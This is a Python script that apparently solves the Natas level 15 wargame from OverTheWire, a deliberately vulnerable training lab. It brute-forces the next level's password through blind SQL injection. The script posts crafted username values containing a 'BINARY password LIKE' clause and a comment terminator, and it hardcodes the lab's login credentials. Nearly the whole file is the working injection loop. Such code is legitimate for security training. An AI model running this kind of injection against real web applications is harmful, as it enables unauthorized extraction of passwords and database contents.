#!/usr/bin/env python3

import requests
import re
from string import *

characters = ascii_letters + digits
#print(characters)

username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

url = 'http://%s.natas.labs.overthewire.org/' %username

session = requests.Session()
#response = session.get(url, auth = (username, password))

seen_password = list()
while(len(seen_password) < 32):
    for ch in characters:
        print('testando '+"".join(seen_password)+ch+"...")
        response = session.post(url, data = {"username" : 'natas16" AND BINARY password LIKE"' + "".join(seen_password) + ch + '%" #'},auth = (username, password))
        content = response.text
        #print(content)
        if ('user exists' in content):
            seen_password.append(ch)
            break

print("".join(seen_password))
